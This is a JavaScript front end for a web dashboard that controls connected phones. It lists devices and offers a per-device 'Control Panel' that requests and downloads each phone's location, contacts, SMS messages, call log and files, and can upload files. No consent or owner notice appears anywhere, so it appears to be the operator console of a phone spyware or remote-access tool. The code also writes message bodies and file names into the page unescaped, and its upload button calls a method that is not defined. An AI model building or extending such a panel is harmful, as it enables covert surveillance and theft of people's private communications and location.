class DeviceManager {
    constructor() {
        this.devices = [];
        this.selectedDevice = null;
        this.map = null;
        this.init();
    }

    async init() {
        this.bindEvents();
        await this.loadDevices();
        setInterval(() => this.loadDevices(), 5000); // Refresh every 5 seconds
    }

    bindEvents() {
        document.getElementById('refresh-btn').addEventListener('click', () => this.loadDevices());
        document.getElementById('close-modal').addEventListener('click', () => this.closeModal());
        document.getElementById('request-location').addEventListener('click', () => this.requestLocation());
        document.getElementById('request-contacts').addEventListener('click', () => this.requestContacts());
        document.getElementById('download-contacts').addEventListener('click', () => this.downloadContacts());
        document.getElementById('request-sms').addEventListener('click', () => this.requestSMS());
        document.getElementById('download-sms').addEventListener('click', () => this.downloadSMS());
        document.getElementById('request-call-log').addEventListener('click', () => this.requestCallLog());
        document.getElementById('download-call-log').addEventListener('click', () => this.downloadCallLog());
        document.getElementById('upload-btn').addEventListener('click', () => this.uploadFile());
        document.getElementById('refresh-files').addEventListener('click', () => this.requestFiles());
        document.getElementById('go-back').addEventListener('click', () => this.goBackDirectory());
        
        // Close modal when clicking outside
        document.getElementById('device-modal').addEventListener('click', (e) => {
            if (e.target.id === 'device-modal') {
                this.closeModal();
            }
        });
    }

    async loadDevices() {
        try {
            const response = await fetch('/api/devices');
            this.devices = await response.json();
            this.renderDevicesTable();
            
            // Update status indicator
            document.getElementById('status').innerHTML = `
                <i class="fas fa-circle text-green-500 mr-1"></i>
                Online
            `;
            document.getElementById('status').className = 'ml-4 px-3 py-1 bg-green-100 text-green-800 text-sm rounded-full font-medium';
        } catch (error) {
            console.error('Error loading devices:', error);
            document.getElementById('status').innerHTML = `
                <i class="fas fa-circle text-red-500 mr-1"></i>
                Offline
            `;
            document.getElementById('status').className = 'ml-4 px-3 py-1 bg-red-100 text-red-800 text-sm rounded-full font-medium';
        }
    }

    renderDevicesTable() {
        const tbody = document.getElementById('devices-tbody');
        const noDevices = document.getElementById('no-devices');
        
        if (this.devices.length === 0) {
            tbody.innerHTML = '';
            noDevices.classList.remove('hidden');
            return;
        }

        noDevices.classList.add('hidden');
        tbody.innerHTML = this.devices.map(device => `
            <tr class="hover:bg-gray-50 transition-colors">
                <td class="px-6 py-4 whitespace-nowrap">
                    <div class="flex items-center">
                        <div class="flex-shrink-0 h-10 w-10">
                            <div class="h-10 w-10 rounded-full bg-gradient-to-r from-blue-500 to-indigo-500 flex items-center justify-center">
                                <i class="fas fa-mobile-alt text-white"></i>
                            </div>
                        </div>
                        <div class="ml-4">
                            <div class="text-sm font-medium text-gray-900">${device.deviceName}</div>
                            <div class="text-sm text-gray-500">${device.brand || ''} ${device.model || ''}</div>
                        </div>
                    </div>
                </td>
                <td class="px-6 py-4 whitespace-nowrap">
                    <div class="flex items-center">
                        <i class="fab fa-${device.platform.toLowerCase() === 'ios' ? 'apple' : 'android'} mr-2 text-gray-600"></i>
                        <div>
                            <div class="text-sm text-gray-900">${device.platform}</div>
                            <div class="text-xs text-gray-500">${device.systemVersion || ''}</div>
                        </div>
                    </div>
                </td>
                <td class="px-6 py-4 whitespace-nowrap">
                    <span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${device.isOnline ? 'bg-green-100 text-green-800' : 'bg-red-100 text-red-800'}">
                        <i class="fas fa-circle mr-1 ${device.isOnline ? 'text-green-500' : 'text-red-500'}"></i>
                        ${device.isOnline ? 'Online' : 'Offline'}
                    </span>
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    <i class="fas fa-calendar mr-1"></i>
                    ${device.firstSeen ? new Date(device.firstSeen).toLocaleDateString() : 'N/A'}
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    <i class="fas fa-clock mr-1"></i>
                    ${new Date(device.lastSeen).toLocaleString()}
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    ${device.location ? 
                        `<i class="fas fa-map-marker-alt text-green-500 mr-1"></i>Available` : 
                        `<i class="fas fa-map-marker-alt text-gray-400 mr-1"></i>Not available`
                    }
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    <i class="fas fa-address-book mr-1"></i>
                    ${device.contactsCount || 0} contacts
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm font-medium">
                    <button onclick="deviceManager.openDeviceModal('${device.id}')" 
                            class="bg-gradient-to-r from-blue-600 to-indigo-600 text-white px-4 py-2 rounded-lg hover:from-blue-700 hover:to-indigo-700 transition-all duration-200 shadow-md ${!device.isOnline ? 'opacity-50' : ''}">
                        <i class="fas fa-cog mr-2"></i>
                        Control
                    </button>
                </td>
            </tr>
        `).join('');
    }

    async openDeviceModal(deviceId) {
        try {
            const response = await fetch(`/api/devices/${deviceId}`);
            this.selectedDevice = await response.json();
            
            document.getElementById('modal-title').innerHTML = `
                <i class="fas fa-mobile-alt mr-2 text-blue-600"></i>
                ${this.selectedDevice.deviceName} Control Panel
            `;
            document.getElementById('device-modal').classList.remove('hidden');
            
            this.initializeMap();
            this.renderContacts();
            this.renderSMS();
            this.renderCallLog();
            this.renderFiles();
            
        } catch (error) {
            console.error('Error loading device details:', error);
        }
    }

    closeModal() {
        document.getElementById('device-modal').classList.add('hidden');
        this.selectedDevice = null;
        if (this.map) {
            this.map.remove();
            this.map = null;
        }
    }

    initializeMap() {
        if (this.map) {
            this.map.remove();
        }
        
        const mapContainer = document.getElementById('map');
        this.map = L.map(mapContainer).setView([40.7128, -74.0060], 10); // Default to NYC
        
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap contributors'
        }).addTo(this.map);
        
        if (this.selectedDevice.location) {
            const { latitude, longitude } = this.selectedDevice.location;
            this.map.setView([latitude, longitude], 15);
            
            L.marker([latitude, longitude])
                .addTo(this.map)
                .bindPopup(`${this.selectedDevice.deviceName}<br>Last updated: ${new Date(this.selectedDevice.location.timestamp).toLocaleString()}`)
                .openPopup();
                
            document.getElementById('location-info').innerHTML = `
                <div class="bg-white rounded-lg p-3 border border-green-200">
                    <div class="text-sm text-gray-600 space-y-1">
                        <p><i class="fas fa-map-pin mr-2 text-green-600"></i><strong>Latitude:</strong> ${latitude.toFixed(6)}</p>
                        <p><i class="fas fa-map-pin mr-2 text-green-600"></i><strong>Longitude:</strong> ${longitude.toFixed(6)}</p>
                        <p><i class="fas fa-clock mr-2 text-green-600"></i><strong>Last Updated:</strong> ${new Date(this.selectedDevice.location.timestamp).toLocaleString()}</p>
                    </div>
                </div>
            `;
        } else {
            document.getElementById('location-info').innerHTML = `
                <div class="bg-white rounded-lg p-3 border border-green-200">
                    <p class="text-sm text-gray-500 text-center">
                        <i class="fas fa-map-marker-alt text-gray-400 mr-2"></i>
                        No location data available
                    </p>
                </div>
            `;
        }
    }

    renderContacts() {
        const contactsList = document.getElementById('contacts-list');
        const contactsCount = document.getElementById('contacts-count');
        
        if (this.selectedDevice.contacts && this.selectedDevice.contacts.length > 0) {
            contactsList.innerHTML = this.selectedDevice.contacts.map(contact => `
                <div class="flex justify-between items-center py-2 border-b border-gray-200 last:border-b-0">
                    <div class="flex items-center">
                        <div class="w-8 h-8 bg-purple-100 rounded-full flex items-center justify-center mr-3">
                            <i class="fas fa-user text-purple-600 text-sm"></i>
                        </div>
                        <div>
                            <p class="text-sm font-medium text-gray-900">${contact.name || 'Unknown'}</p>
                            <p class="text-xs text-gray-500">
                                ${contact.phoneNumbers && contact.phoneNumbers.length > 0 ? contact.phoneNumbers[0].number : 'No phone'}
                            </p>
                            ${contact.emails && contact.emails.length > 0 ? `
                                <p class="text-xs text-gray-400">${contact.emails[0].email}</p>
                            ` : ''}
                        </div>
                    </div>
                </div>
            `).join('');
            
            contactsCount.innerHTML = `<i class="fas fa-users mr-1"></i>${this.selectedDevice.contacts.length} total contacts`;
        } else {
            contactsList.innerHTML = `
                <div class="text-center py-4">
                    <i class="fas fa-address-book text-gray-400 text-2xl mb-2 block"></i>
                    <p class="text-sm text-gray-500">No contacts available</p>
                    <p class="text-xs text-gray-400">Click "Refresh Contacts" to load</p>
                </div>
            `;
            contactsCount.textContent = '';
        }
    }

    renderSMS() {
        const smsList = document.getElementById('sms-list');
        const smsCount = document.getElementById('sms-count');
        
        if (this.selectedDevice.sms?.error) {
            smsList.innerHTML = `
                <div class="text-center py-4">
                    <i class="fas fa-exclamation-triangle text-yellow-500 text-2xl mb-2 block"></i>
                    <p class="text-sm text-gray-700 mb-2">${this.selectedDevice.sms.error}</p>
                    <p class="text-xs text-gray-500">SMS access requires native implementation</p>
                </div>
            `;
            smsCount.textContent = 'SMS access not available';
        } else if (this.selectedDevice.sms?.messages && this.selectedDevice.sms.messages.length > 0) {
            smsList.innerHTML = this.selectedDevice.sms.messages.map(message => `
                <div class="flex justify-between items-start py-3 border-b border-gray-200 last:border-b-0">
                    <div class="flex items-start flex-1">
                        <div class="w-8 h-8 ${message.type === 'sent' ? 'bg-blue-100' : 'bg-green-100'} rounded-full flex items-center justify-center mr-3 mt-1">
                            <i class="fas fa-${message.type === 'sent' ? 'arrow-up' : 'arrow-down'} text-${message.type === 'sent' ? 'blue' : 'green'}-600 text-xs"></i>
                        </div>
                        <div class="flex-1">
                            <div class="flex items-center justify-between mb-1">
                                <p class="text-sm font-medium text-gray-900">${message.address}</p>
                                <span class="text-xs text-gray-500">${new Date(message.date).toLocaleString()}</span>
                            </div>
                            <p class="text-sm text-gray-700">${message.body}</p>
                        </div>
                    </div>
                </div>
            `).join('');
            
            smsCount.innerHTML = `<i class="fas fa-sms mr-1"></i>${this.selectedDevice.sms.messages.length} messages`;
        } else {
            smsList.innerHTML = `
                <div class="text-center py-4">
                    <i class="fas fa-sms text-gray-400 text-2xl mb-2 block"></i>
                    <p class="text-sm text-gray-500">No messages available</p>
                    <p class="text-xs text-gray-400">Click "Load Messages" to fetch SMS</p>
                </div>
            `;
            smsCount.textContent = '';
        }
    }

    renderCallLog() {
        const callLogList = document.getElementById('call-log-list');
        const callLogCount = document.getElementById('call-log-count');
        
        if (this.selectedDevice.callLog && this.selectedDevice.callLog.length > 0) {
            callLogList.innerHTML = this.selectedDevice.callLog.map(call => `
                <div class="flex justify-between items-start py-3 border-b border-gray-200 last:border-b-0">
                    <div class="flex items-start flex-1">
                        <div class="w-8 h-8 ${this.getCallTypeColor(call.type)} rounded-full flex items-center justify-center mr-3 mt-1">
                            <i class="fas fa-${this.getCallTypeIcon(call.type)} text-white text-xs"></i>
                        </div>
                        <div class="flex-1">
                            <div class="flex items-center justify-between mb-1">
                                <p class="text-sm font-medium text-gray-900">${call.name || call.phoneNumber}</p>
                                <span class="text-xs text-gray-500">${new Date(call.timestamp).toLocaleString()}</span>
                            </div>
                            <p class="text-xs text-gray-500">${call.phoneNumber}</p>
                            <p class="text-xs text-gray-400">
                                ${call.type} • ${call.duration > 0 ? this.formatDuration(call.duration) : 'No duration'}
                            </p>
                        </div>
                    </div>
                </div>
            `).join('');
            
            callLogCount.innerHTML = `<i class="fas fa-phone mr-1"></i>${this.selectedDevice.callLog.length} calls`;
        } else {
            callLogList.innerHTML = `
                <div class="text-center py-4">
                    <i class="fas fa-phone text-gray-400 text-2xl mb-2 block"></i>
                    <p class="text-sm text-gray-500">No call history available</p>
                    <p class="text-xs text-gray-400">Click "Load Call Log" to fetch history</p>
                </div>
            `;
            callLogCount.textContent = '';
        }
    }

    getCallTypeColor(type) {
        switch (type) {
            case 'incoming': return 'bg-green-500';
            case 'outgoing': return 'bg-blue-500';
            case 'missed': return 'bg-red-500';
            default: return 'bg-gray-500';
        }
    }

    getCallTypeIcon(type) {
        switch (type) {
            case 'incoming': return 'phone';
            case 'outgoing': return 'phone';
            case 'missed': return 'phone-slash';
            default: return 'phone';
        }
    }

    formatDuration(seconds) {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
    }
    renderFiles() {
        const fileBrowser = document.getElementById('file-browser');
        const currentPath = document.getElementById('current-path');
        const goBackBtn = document.getElementById('go-back');
        
        if (this.selectedDevice.currentPath) {
            currentPath.textContent = this.selectedDevice.currentPath;
            goBackBtn.disabled = this.selectedDevice.currentPath === this.selectedDevice.currentPath.split('/').slice(0, -1).join('/');
        }
        
        if (this.selectedDevice.files && this.selectedDevice.files.length > 0) {
            fileBrowser.innerHTML = `
                <div class="divide-y divide-gray-100">
                    ${this.selectedDevice.files.map(file => `
                        <div class="flex items-center justify-between py-3 px-4 hover:bg-gray-50 transition-colors cursor-pointer" onclick="deviceManager.${file.type === 'folder' ? `browseDirectory('${file.path}')` : `downloadFile('${file.path}')`}">
                            <div class="flex items-center flex-1">
                                <i class="fas fa-${file.type === 'folder' ? 'folder text-blue-500' : this.getFileIcon(file.name)} mr-3 text-lg"></i>
                                <div class="flex-1">
                                    <p class="text-sm font-medium text-gray-900">${file.name}</p>
                                    <p class="text-xs text-gray-500">
                                        ${file.type === 'folder' ? 'Folder' : this.formatFileSize(file.size)} • 
                                        ${new Date(file.lastModified).toLocaleDateString()}
                                    </p>
                                </div>
                            </div>
                            <div class="flex items-center space-x-2">
                                <button onclick="event.stopPropagation(); deviceManager.downloadFile('${file.path}')" class="text-blue-600 hover:text-blue-700 p-1" title="Download">
                                    <i class="fas fa-download"></i>
                                </button>
                                ${file.type !== 'folder' ? `
                                    <button onclick="event.stopPropagation(); deviceManager.deleteFile('${file.path}')" class="text-red-600 hover:text-red-700 p-1" title="Delete">
                                        <i class="fas fa-trash"></i>
                                    </button>
                                ` : ''}
                                ${file.type === 'folder' ? `
                                    <i class="fas fa-chevron-right text-gray-400"></i>
                                ` : ''}
                            </div>
                        </div>
                    `).join('')}
                </div>
            `;
        } else {
            fileBrowser.innerHTML = `
                <div class="p-4">
                    <div class="text-center py-8">
                        <i class="fas fa-folder-open text-gray-400 text-3xl mb-3 block"></i>
                        <p class="text-sm text-gray-500">This folder is empty</p>
                        <p class="text-xs text-gray-400">No files or folders found</p>
                    </div>
                </div>
            `;
        }
    }

    getFileIcon(filename) {
        const ext = filename.split('.').pop().toLowerCase();
        const iconMap = {
            'jpg': 'image text-green-500',
            'jpeg': 'image text-green-500',
            'png': 'image text-green-500',
            'gif': 'image text-green-500',
            'mp4': 'video text-red-500',
            'avi': 'video text-red-500',
            'mov': 'video text-red-500',
            'mp3': 'music text-purple-500',
            'wav': 'music text-purple-500',
            'pdf': 'file-pdf text-red-600',
            'doc': 'file-word text-blue-600',
            'docx': 'file-word text-blue-600',
            'txt': 'file-alt text-gray-500',
            'zip': 'file-archive text-yellow-600',
            'rar': 'file-archive text-yellow-600',
        };
        return iconMap[ext] || 'file text-gray-500';
    }

    formatFileSize(bytes) {
        if (bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }

    async browseDirectory(path) {
        try {
            const response = await fetch(`/api/devices/${this.selectedDevice.id}/browse-directory`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ path })
            });
            
            if (response.ok) {
                // Show loading state
                document.getElementById('file-browser').innerHTML = `
                    <div class="p-4">
                        <div class="text-center py-8">
                            <i class="fas fa-spinner fa-spin text-orange-600 text-2xl mb-2 block"></i>
                            <p class="text-sm text-gray-500">Loading directory...</p>
                        </div>
                    </div>
                `;
                
                // Update current path immediately
                this.selectedDevice.currentPath = path;
                document.getElementById('current-path').textContent = path;
                document.getElementById('go-back').disabled = path === '/storage/emulated/0';
                
                // Refresh device data after a short delay
                setTimeout(() => this.openDeviceModal(this.selectedDevice.id), 2000);
            }
        } catch (error) {
            console.error('Error browsing directory:', error);
        }
    }

    goBackDirectory() {
        const currentPath = this.selectedDevice.currentPath || '/storage/emulated/0';
        const parentPath = currentPath.substring(0, currentPath.lastIndexOf('/')) || '/storage/emulated/0';
        this.browseDirectory(parentPath);
    }

    downloadFile(filePath) {
        if (!this.selectedDevice.isOnline) {
            alert('Device is offline. Cannot download file.');
            return;
        }
        
        fetch(`/api/devices/${this.selectedDevice.id}/download-file`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ filePath })
        })
        .then(response => response.json())
        .then(result => {
            if (result.success) {
                alert('File download request sent. Check server logs for file content.');
            } else {
                alert('Failed to request file download');
            }
        })
        .catch(error => {
            console.error('Error requesting file download:', error);
            alert('Failed to request file download');
        });
    }

    deleteFile(filePath) {
        if (confirm(`Are you sure you want to delete ${filePath}?`)) {
            // In a real implementation, this would delete the file on the device
            alert(`Delete functionality for ${filePath} would be implemented here`);
        }
    }

    async requestSMS() {
        try {
            const response = await fetch(`/api/devices/${this.selectedDevice.id}/request-sms`, {
                method: 'POST'
            });
            const result = await response.json();
            
            if (result.success) {
                // Show loading state
                document.getElementById('sms-list').innerHTML = `
                    <div class="text-center py-4">
                        <i class="fas fa-spinner fa-spin text-blue-600 text-2xl mb-2 block"></i>
                        <p class="text-sm text-gray-500">Loading messages from device...</p>
                    </div>
                `;
                
                // Refresh device data after a short delay
                setTimeout(() => this.openDeviceModal(this.selectedDevice.id), 3000);
            }
        } catch (error) {
            console.error('Error requesting SMS:', error);
            alert('Failed to request SMS');
        }
    }

    async downloadSMS() {
        try {
            const response = await fetch(`/api/devices/${this.selectedDevice.id}/sms/download`);
            const blob = await response.blob();
            
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            a.download = `sms-${this.selectedDevice.deviceName.replace(/[^a-zA-Z0-9]/g, '_')}-${new Date().toISOString().split('T')[0]}.json`;
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);
        } catch (error) {
            console.error('Error downloading SMS:', error);
            alert('Failed to download SMS');
        }
    }

    async requestCallLog() {
        try {
            const response = await fetch(`/api/devices/${this.selectedDevice.id}/request-call-log`, {
                method: 'POST'
            });
            const result = await response.json();
            
            if (result.success) {
                // Show loading state
                document.getElementById('call-log-list').innerHTML = `
                    <div class="text-center py-4">
                        <i class="fas fa-spinner fa-spin text-green-600 text-2xl mb-2 block"></i>
                        <p class="text-sm text-gray-500">Loading call history from device...</p>
                    </div>
                `;
                
                // Refresh device data after a short delay
                setTimeout(() => this.openDeviceModal(this.selectedDevice.id), 3000);
            }
        } catch (error) {
            console.error('Error requesting call log:', error);
            alert('Failed to request call log');
        }
    }

    async downloadCallLog() {
        try {
            const response = await fetch(`/api/devices/${this.selectedDevice.id}/call-log/download`);
            const blob = await response.blob();
            
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            a.download = `call-log-${this.selectedDevice.deviceName.replace(/[^a-zA-Z0-9]/g, '_')}-${new Date().toISOString().split('T')[0]}.json`;
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);
        } catch (error) {
            console.error('Error downloading call log:', error);
            alert('Failed to download call log');
        }
    }
    async requestLocation() {
        try {
            const response = await fetch(`/api/devices/${this.selectedDevice.id}/request-location`, {
                method: 'POST'
            });
            const result = await response.json();
            
            if (result.success) {
                // Show loading state
                document.getElementById('location-info').innerHTML = `
                    <div class="bg-white rounded-lg p-3 border border-green-200">
                        <p class="text-sm text-gray-500 text-center">
                            <i class="fas fa-spinner fa-spin mr-2 text-green-600"></i>
                            Requesting location from device...
                        </p>
                    </div>
                `;
                
                // Refresh device data after a short delay
                setTimeout(() => this.openDeviceModal(this.selectedDevice.id), 3000);
            }
        } catch (error) {
            console.error('Error requesting location:', error);
            alert('Failed to request location');
        }
    }

    async requestContacts() {
        try {
            const response = await fetch(`/api/devices/${this.selectedDevice.id}/request-contacts`, {
                method: 'POST'
            });
            const result = await response.json();
            
            if (result.success) {
                // Show loading state
                document.getElementById('contacts-list').innerHTML = `
                    <div class="text-center py-4">
                        <i class="fas fa-spinner fa-spin text-purple-600 text-2xl mb-2 block"></i>
                        <p class="text-sm text-gray-500">Loading contacts from device...</p>
                    </div>
                `;
                
                // Refresh device data after a short delay
                setTimeout(() => this.openDeviceModal(this.selectedDevice.id), 3000);
            }
        } catch (error) {
            console.error('Error requesting contacts:', error);
            alert('Failed to request contacts');
        }
    }

    async requestFiles() {
        try {
            const response = await fetch(`/api/devices/${this.selectedDevice.id}/request-files`, {
                method: 'POST'
            });
            const result = await response.json();
            
            if (result.success) {
                // Show loading state
                document.getElementById('file-browser').innerHTML = `
                    <div class="text-center py-4">
                        <i class="fas fa-spinner fa-spin text-orange-600 text-2xl mb-2 block"></i>
                        <p class="text-sm text-gray-500">Loading files from device...</p>
                    </div>
                `;
                
                // Refresh device data after a short delay
                setTimeout(() => this.openDeviceModal(this.selectedDevice.id), 3000);
            }
        } catch (error) {
            console.error('Error requesting files:', error);
            alert('Failed to request files');
        }
    }

    async downloadContacts() {
        try {
            const response = await fetch(`/api/devices/${this.selectedDevice.id}/contacts/download`);
            const blob = await response.blob();
            
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            a.download = `contacts-${this.selectedDevice.deviceName}-${new Date().toISOString().split('T')[0]}.json`;
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);
        } catch (error) {
            console.error('Error downloading contacts:', error);
            alert('Failed to download contacts');
        }
    }

    triggerFileUpload() {
        const fileInput = document.getElementById('file-upload');
        fileInput.click();
        
        fileInput.onchange = (event) => {
            const files = event.target.files;
            if (files && files.length > 0) {
                this.uploadFiles(files);
            }
        };
    }

    async uploadFiles(files) {
        for (let i = 0; i < files.length; i++) {
            await this.uploadSingleFile(files[i]);
        }
        
        // Refresh file list after upload
        this.requestFiles();
    }

    async uploadSingleFile(file) {
        const formData = new FormData();
        formData.append('file', file);
        
        try {
            const response = await fetch(`/api/devices/${this.selectedDevice.id}/upload`, {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            
            if (result.success) {
                console.log(`File ${file.name} uploaded successfully`);
            } else {
                alert(`Upload failed for ${file.name}`);
            }
        } catch (error) {
            console.error(`Error uploading file ${file.name}:`, error);
            alert(`Upload failed for ${file.name}`);
        }
    }
}

// Initialize the device manager when the page loads
const deviceManager = new DeviceManager();